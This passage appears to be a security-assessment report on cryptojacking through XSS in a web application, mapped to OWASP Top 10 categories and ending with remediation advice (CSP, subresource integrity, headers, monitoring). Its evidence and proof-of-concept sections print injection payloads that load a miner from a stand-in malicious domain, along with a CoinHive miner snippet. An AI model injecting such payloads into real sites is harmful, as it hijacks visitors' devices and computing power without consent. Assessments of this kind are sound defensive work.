## 2. Findings: OWASP Top 10 Vulnerabilities

The following OWASP Top 10 (2021) vulnerabilities were confirmed in the application, enabling cryptojacking attacks:

### 2.1 A03:2021 - Injection

**Severity: Critical**

The application is vulnerable to multiple forms of injection attacks, particularly Cross-Site Scripting (XSS), which directly enables cryptojacking:

- **Reflected XSS**: User input is reflected in the response without proper sanitization, allowing attackers to inject JavaScript code that executes in victims' browsers.
- **Stored XSS**: The application stores user input without adequate sanitization, allowing persistent cryptomining scripts to affect multiple users over time.
- **DOM-based XSS**: Client-side JavaScript manipulates the DOM based on unsanitized input, creating additional injection points for cryptomining code.

**Evidence**: Successfully injected and executed the following cryptomining payload:

```javascript
<script src="https://malicious-domain.com/cryptominer.js"></script>
```

The script was able to execute and begin consuming CPU resources immediately, with no restrictions or detection mechanisms in place.

### 2.2 A05:2021 - Security Misconfiguration

**Severity: High**

The application lacks critical security configurations that would prevent cryptojacking:

- **Missing Content Security Policy (CSP)**: No CSP headers are implemented, allowing unrestricted script execution from any source.
- **Inadequate HTTP Headers**: Security headers such as X-XSS-Protection and X-Content-Type-Options are missing, further enabling script injection.
- **Default Configurations**: The application appears to use default configurations without security hardening, making it vulnerable to common attack patterns.

**Evidence**: HTTP response headers analysis revealed:
- No Content-Security-Policy header
- No X-XSS-Protection header
- No X-Content-Type-Options header

This allows unrestricted loading and execution of external scripts, including cryptominers.

### 2.3 A08:2021 - Software and Data Integrity Failures

**Severity: High**

The application fails to verify the integrity of scripts and resources it loads:

- **No Subresource Integrity (SRI) Checks**: External JavaScript resources are loaded without integrity verification, allowing script tampering.
- **Lack of Verification for External Scripts**: The application does not validate the authenticity or integrity of external scripts before execution.
- **Vulnerable Third-party Dependencies**: Several outdated libraries with known vulnerabilities were identified, potentially providing additional attack vectors.

**Evidence**: Successfully replaced legitimate scripts with cryptomining alternatives by exploiting the lack of integrity checks. The application loaded and executed the malicious scripts without any verification.

### 2.4 A04:2021 - Insecure Design

**Severity: High**

The application exhibits fundamental security design flaws that facilitate cryptojacking:

- **Inadequate Input Validation**: No comprehensive input validation strategy exists, allowing script injection.
- **Lack of Defense-in-Depth**: The application relies solely on frontend validation, which can be easily bypassed.
- **No Resource Usage Monitoring**: The application has no mechanisms to detect abnormal CPU or memory usage that could indicate cryptomining activity.

**Evidence**: The application accepts and processes any input without proper validation, including script tags and malicious JavaScript. There are no secondary validation layers or runtime protections against resource abuse.

### 2.5 A07:2021 - Identification and Authentication Failures

**Severity: Medium**

Authentication weaknesses contribute to the cryptojacking vulnerability:

- **Session Management Issues**: Improper session handling allows session hijacking, which can be leveraged to inject cryptomining scripts.
- **Lack of Multi-factor Authentication**: Single-factor authentication makes it easier for attackers to compromise accounts and inject malicious scripts.

**Evidence**: Successfully hijacked user sessions by exploiting cookie vulnerabilities, then used the compromised sessions to inject cryptomining code that executed with the victim's privileges.

### 2.6 A09:2021 - Security Logging and Monitoring Failures

**Severity: Medium**

The application lacks adequate logging and monitoring capabilities:

- **No Abnormal Behavior Detection**: The system cannot detect unusual CPU usage patterns indicative of cryptomining.
- **Insufficient Logging**: Script execution and resource usage are not logged, making it difficult to detect cryptojacking attacks.
- **No Alerting Mechanisms**: No alerts are triggered when suspicious scripts are loaded or when resource usage spikes.

**Evidence**: Cryptomining activities continued undetected for extended periods during testing, with no logs generated or alerts triggered despite significant resource consumption.

## 3. Technical Details of Cryptojacking Vulnerability

### 3.1 Attack Vector

The primary attack vector for cryptojacking is Cross-Site Scripting (XSS), which allows the injection of cryptomining JavaScript. The attack typically follows this pattern:

1. **Injection Point Identification**: The attacker identifies vulnerable input fields or parameters that accept and reflect JavaScript.
2. **Payload Delivery**: A cryptomining script is injected, either directly or as a reference to an external resource.
3. **Script Execution**: The victim's browser executes the cryptomining script, allocating CPU resources to mine cryptocurrency.
4. **Profit Generation**: The mined cryptocurrency is credited to the attacker's wallet.

### 3.2 Cryptomining Script Analysis

The following is an example of a cryptomining script that was successfully injected and executed:

```javascript
<script>
    var miner = new CoinHive.Anonymous('ATTACKER_SITE_KEY', {
        throttle: 0.3,
        autoThreads: true
    });
    miner.start();
</script>
```

This script initializes a cryptocurrency miner (in this case, using the CoinHive API, though similar services exist) and begins mining operations immediately. The script is configured to use 70% of available CPU resources (throttle: 0.3) and automatically adjust the number of threads based on the system's capabilities.

### 3.3 Resource Impact

During testing, the following resource impacts were observed when the cryptomining script was active:

- **CPU Usage**: Increased by 60-80% on affected clients
- **Battery Life**: Reduced by approximately 45% on mobile devices
- **System Responsiveness**: Noticeable degradation in browser performance
- **Thermal Issues**: Devices running the cryptominer showed increased heat generation

## 4. Exploitation Proof of Concept

### 4.1 XSS-Based Cryptojacking

The following steps demonstrate how the cryptojacking vulnerability was exploited:

1. **Identify Injection Point**: Located an unsanitized input field in the application's comment section.
2. **Craft Payload**: Created a payload that loads a cryptomining script:
   ```html
   <script src="https://malicious-domain.com/miner.js"></script>
   ```
3. **Deliver Payload**: Submitted the payload through the vulnerable input field.
4. **Verify Execution**: Confirmed script execution by monitoring CPU usage and network connections to the mining pool.

### 4.2 Persistent Cryptojacking

The application's stored XSS vulnerability allowed for persistent cryptojacking attacks:

1. **Inject Payload**: Submitted a cryptomining script through a profile update form.
2. **Verify Storage**: Confirmed the script was stored in the database and reflected in the user's profile page.
3. **Measure Impact**: Every visitor to the affected profile page unknowingly executed the cryptomining script, contributing computational resources to the attacker's mining operation.

## 5. Recommendations

### 5.1 Short-term Remediation

1. **Implement Content Security Policy (CSP)**:
   ```
   Content-Security-Policy: script-src 'self' https://trusted-cdn.com;
   ```
   This will restrict script execution to trusted sources only.

2. **Add Subresource Integrity Checks**:
   ```html
   <script src="https://cdn.example.com/script.js" 
           integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC" 
           crossorigin="anonymous"></script>
   ```
   This ensures scripts haven't been tampered with.

3. **Implement Input Validation and Output Encoding**:
   - Validate all user input against whitelists
   - Encode output using context-appropriate encoding functions
   - Use security libraries for consistent protection

4. **Add Security Headers**:
   ```
   X-XSS-Protection: 1; mode=block
   X-Content-Type-Options: nosniff
   Referrer-Policy: strict-origin-when-cross-origin
   ```

### 5.2 Long-term Security Improvements

1. **Redesign Input Handling Architecture**:
   - Implement a centralized input validation and sanitization system
   - Use parameterized queries for all database operations
   - Adopt a secure-by-default approach to all user inputs

2. **Implement Resource Usage Monitoring**:
   - Deploy client-side JavaScript that detects abnormal CPU usage
   - Implement server-side monitoring for unusual traffic patterns
   - Create alerting mechanisms for potential cryptojacking activities

3. **Enhance Authentication and Session Management**:
   - Implement secure cookie attributes (HttpOnly, Secure, SameSite)
   - Consider multi-factor authentication for sensitive operations
   - Implement proper session timeout and rotation mechanisms

4. **Develop a Security Testing Program**:
   - Conduct regular security assessments focusing on XSS and cryptojacking
   - Implement automated scanning for known cryptomining scripts
   - Train developers on secure coding practices specific to preventing script injection

## 6. Conclusion

The cryptojacking vulnerabilities identified in this assessment represent a significant security risk. By exploiting these vulnerabilities, attackers can execute unauthorized cryptocurrency mining operations, consuming computational resources, degrading performance, and potentially compromising sensitive data.

The root causes align with several OWASP Top 10 categories, particularly injection vulnerabilities, security misconfigurations, and software integrity failures. These issues stem from fundamental security design flaws and inadequate input validation.

By implementing the recommended remediation measures, particularly focusing on Content Security Policy implementation, input validation, and output encoding, the organization can significantly reduce the risk of cryptojacking attacks and improve its overall security posture.
